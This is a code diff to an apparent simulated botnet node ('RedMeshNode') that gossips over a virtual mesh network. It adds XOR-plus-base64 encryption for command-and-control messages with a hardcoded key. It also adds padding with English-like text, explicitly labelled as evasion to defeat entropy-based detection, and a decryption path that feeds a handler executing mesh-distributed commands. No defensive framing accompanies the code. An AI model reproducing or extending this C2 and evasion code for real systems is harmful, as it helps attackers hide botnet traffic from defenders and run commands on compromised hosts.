@@ -15,6 +15,7 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 import config
 import utils
 import urllib.parse
+import base64
 from vnet.nic import VNic
 from vnet.protocol import MSG_DATA
 
@@ -46,6 +47,25 @@ class RedMeshNode:
         # Virtual Network
         self.nic = VNic(f"10.0.{random.randint(20,200)}.{random.randint(2,254)}")
         self.known_targets = set()
+
+        # C2 Encryption Key (Shared Static for Sim)
+        self.c2_key = b"DEADBEEF"
+
+    def encrypt_c2(self, payload):
+        """XOR Encryption for C2 with Entropy Reduction (Padding)."""
+        data = json.dumps(payload).encode()
+        encrypted = bytearray()
+        for i in range(len(data)):
+            encrypted.append(data[i] ^ self.c2_key[i % len(self.c2_key)])
+
+        b64 = base64.b64encode(encrypted).decode()
+
+        # Evasion: Append low-entropy padding if stealth gene is high
+        if self.genes['stealth']:
+            # Pad with repeated characters or English-like text to lower average entropy
+            padding = "The quick brown fox jumps over the lazy dog. " * int(len(b64) / 10)
+            return b64 + "||PADDING||" + padding
+        return b64
 
     def get_state(self):
         # Quantize state: (PeerCount_Bucket, Success_Bool)
@@ -127,17 +147,26 @@ class RedMeshNode:
         self.nic.send(target, payload)
 
     def broadcast(self, msg_type, payload):
-        """Send message to mesh."""
-        msg = {
+        """Send message to mesh (Encrypted)."""
+        inner_msg = {
             "ver": 1,
             "sender": NODE_ID,
             "type": msg_type,
             "payload": payload,
-            "genes": self.genes, # Share genes for Crossover
-            "brain": self.brain.q_table, # Federated Learning
+            "genes": self.genes,
+            "brain": self.brain.q_table,
             "ts": time.time()
         }
-        data = json.dumps(msg).encode('utf-8')
+
+        # Encrypt the entire inner message
+        blob = self.encrypt_c2(inner_msg)
+
+        wrapper = {
+            "proto": "C2v2",
+            "blob": blob
+        }
+
+        data = json.dumps(wrapper).encode('utf-8')
         try:
             self.sender.sendto(data, (MCAST_GRP, MCAST_PORT))
         except Exception as e:
@@ -219,11 +248,30 @@ class RedMeshNode:
                        str(new_jitter), str(new_aggro), str(new_stealth)]
                 subprocess.Popen(cmd)
 
+    def decrypt_c2(self, blob):
+        try:
+            # Strip padding
+            if "||PADDING||" in blob:
+                blob = blob.split("||PADDING||")[0]
+
+            encrypted = base64.b64decode(blob)
+            decrypted = bytearray()
+            for i in range(len(encrypted)):
+                decrypted.append(encrypted[i] ^ self.c2_key[i % len(self.c2_key)])
+            return json.loads(decrypted.decode())
+        except: return None
+
     def listener(self):
         while self.running:
             try:
-                data, addr = self.sock.recvfrom(1024)
-                msg = json.loads(data.decode('utf-8'))
+                data, addr = self.sock.recvfrom(4096)
+                wrapper = json.loads(data.decode('utf-8'))
+
+                if wrapper.get("proto") == "C2v2":
+                    msg = self.decrypt_c2(wrapper["blob"])
+                    if not msg: continue
+                else:
+                    msg = wrapper # Fallback legacy
 
                 sender = msg.get('sender')
                 if sender == NODE_ID: continue # Ignore self
@@ -243,7 +291,6 @@ class RedMeshNode:
 
                 msg_type = msg.get('type')
                 if msg_type == "CMD":
-                    # Decentralized Execution
                     cmd = msg.get('payload')
                     logger.info(f"Executing Mesh Command: {cmd}")
 
